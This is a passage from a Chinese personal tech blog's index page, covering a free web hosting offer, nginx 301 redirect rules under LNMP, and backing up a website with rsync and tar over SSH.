class="wp_keywordlink_affiliate">免费空间</span>申请比较简单，只需3个步骤：<strong>注册-收邮件-登陆后台</strong>，值得注意的是该主机商域名为新注册的，持久性还有待验证，下面给出<span class="wp_keywordlink_affiliate">免费空间</span>的详细信息：</p><p>1000MB磁盘空间</p><p>50GB的带宽</p><p>5插件域</p><p>5MySQL数据库</p><p>5个域名停放</p><p>5子域</p><p>无广告</p><p>cPanel面板</p><p>即时激活</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313739/lnmp下的nginx301重定向设置/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313739/lnmp下的nginx301重定向设置/" itemprop="url">lnmp下的nginx301重定向设置</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-08T03:54:08+08:00">2014-03-08</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/个人日志/" itemprop="url" rel="index"><span itemprop="name">个人日志</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">120</span></span></div></header><div class="post-body" itemprop="articleBody"><p>LNMP下的301重定向与lnmpa下的重定向不太一样，需要设置nginx的重写规则。比如常用的非www域名重定向到www域名上，或者把index.html重定向到目录下 <code>/</code></p><p>下面是找到的关于lnmpa下的nginx配置规则</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> ( <span class="variable">$request_uri</span> <span class="regexp">~* /index\.(html|htm|php)$</span> ) &#123;</span><br><span class="line">	<span class="attribute">rewrite</span><span class="regexp"> ^(.*)index\.(html|htm|php)$</span> <span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$host</span> !<span class="regexp">~* ^www\.)</span> &#123;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> <span class="variable">$scheme</span>://www.<span class="variable">$host</span>/<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你添加一个虚拟主机，在server下 添加上面的规则即可。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313734/通过ssh使用rsync简单备份你的网站/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313734/通过ssh使用rsync简单备份你的网站/" itemprop="url">通过ssh使用rsync简单备份你的网站</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-08T01:42:22+08:00">2014-03-08</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/个人日志/" itemprop="url" rel="index"><span itemprop="name">个人日志</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">814</span></span></div></header><div class="post-body" itemprop="articleBody"><p>如果你想要从一台电脑上备份一个目录，但你仅仅想要复制改变的文件到它的备份而不是复制所有的东西到各自的备份，你可以使用工具rsync来实现它。你需要在这个远程的源备份计算机上有一个账户。下面是这条命令：</p><p><code>rsync -vare ssh root@192.168.1.10:/home/wwwroot/love4026.org/* /home/wwwroot/love4026.org/</code></p><p><strong>Rsync 参数选项说明</strong></p><p>-v, –verbose 详细模式输出<br>-q, –quiet 精简输出模式<br>-c, –checksum 打开校验开关，强制对文件传输进行校验<br>-a, –archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD<br>-r, –recursive 对子目录以递归模式处理<br>-R, –relative 使用相对路径信息<br>-e, –rsh=COMMAND 指定使用rsh、ssh方式进行数据同步</p><p>-l, –links 保留软链结<br>-p, –perms 保持文件权限<br>-t, –times 保持文件时间信息<br>-g, –group 保持文件属组信息<br>-o, –owner 保持文件属主信息<br>-D, –devices 保持设备文件信息<br>-z, –compress 对备份的文件在传输时进行压缩处理</p><p>rsync使大型目录结构保持同步。通过SSH使用tar远程复制一个文件系统的一部分是非常理想的，sync甚至更适合保持两台机器之间的文件系统的同步。为了使用SSH运行一个rsyns，传递给它一个-e转换：</p><p><code>rsync -ave ssh greendome:/home/ftp/pub/ /home/ftp/pub/</code></p><p>注意从源端（在greendome上）来的文件说明后面的 / ，在源说明中，一个尾部的 / 告诉rsync这个目录的内容，但不是目录本身。为了将目录放入正在复制的内容的最高等级丢掉这个 /：</p><p><code>rsync -ave ssh bcnu:/home/six .</code></p><p>这将在 ~/six/目录下保持一个与bcnu:/home/six/上的任何东西同步的复制品。rsync默认只拷贝文件和目录，但是当源端移除了文件时并不会在目的端移除它们的拷贝。为了保持复制的精确性，包含–delete这个标志：</p><p>现在当老的报表从greendome上的~one/reports/中移除了，在同步版本中，每次这个命令运行时，它们也将会从~six/public_html/reports/中移除。如果你在corn中像这样运行一条命令，记得丢掉v。这将会使输出稳定（除非rsync在运行中出现问题，在这种情况下你将会收到一封有错误输出的邮件）。使用SSH作为你的rsync运输方式，这样做的好处是使数据在网络传输过程中加密，并可以方便使用任何你已经用SSH客户端密钥建立的信任关系。</p><p><code>rsync -ave ssh--delete greendome:~one/reports .</code></p><p>更新：备份远程数据库还有一个方法，此方法不要求两边的电脑上都必须安装rsync,就是使用tar命令。一边tar一边通过ssh传到服务器并且自动解压缩，最后会得到远程服务器上文件夹的一份完美备份，并且在目标服务器上不会写入任何文件。方法如下：</p><p><code>tar zcf - /some/localfolder | ssh remotehost.domain.com &quot;cd /some/path/name; tar zxpf -&quot;</code></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article></section><nav class="pagination"><a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a> <a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a></nav></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><section class="site-overview-wrap sidebar-panel sidebar-panel-active"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/logo.png" alt="Ray Chang"><p class="site-author-name" itemprop="name">Ray Chang</p><p class="site-description motion-element" itemprop="description">Think Difficulty</p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">416</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/index.html"><span class="site-state-item-count">10</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">242</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/sbmzhcn" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a href="https://twitter.com/love4026/" target="_blank" title="Twitter"><i class="fa fa-fw fa-twitter"></i> Twitter</a></span><span class="links-of-author-item"><a href="https://plus.google.com/u/0/106618658391372851068" target="_blank" title="Google Plus"><i class="fa fa-fw fa-google"></i> Google Plus</a></span><span class="links-of-author-item"><a href="https://www.facebook.com/love4026" target="_blank" title="Facebook"><i class="fa fa-fw fa-facebook"></i> Facebook</a></span><span class="links-of-author-item"><a href="https://www.v2ex.com/member/sbmzhcn" target="_blank" title="V2EX"><i class="fa fa-fw fa-globe"></i> V2EX</a></span><span class="links-of-author-item"><a href="mailto:love4026@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i> E-Mail</a></span></div><div class="cc-license motion-element" itemprop="license"> <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a></div><div class="links-of-blogroll motion-element links-of-blogroll-inline"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> Links</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"> <a href="http://www.lanthy.com/" title="蓝悉" target="_blank">蓝悉</a></li><li class="links-of-blogroll-item"> <a href="http://www.shibang-china.com/" title="世邦中文" target="_blank">世邦中文</a></li><li class="links-of-blogroll-item"> <a href="http://www.sbmchina.com/" title="世邦英文" target="_blank">世邦英文</a></li><li class="links-of-blogroll-item"> <a href="http://www.kamychina.com/" title="科煤机电" target="_blank">科煤机电</a></li></ul></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">Copyright &copy; <span itemprop="copyrightYear">2018</span><span class="with-love" id="heart"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">Ray Chang. Allrights reserved.</span></div><div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div> <span class="post-meta-divider">|</span><div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4, modified by Ray Chang.</div><div class="busuanzi-count"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="site-uv"><i class="fa fa-user"></i> 本站访客数<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人次</span><span class="site-pv"><i class="fa fa-eye"></i> 本站总访问量<span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次</span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css"><script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script></body></html>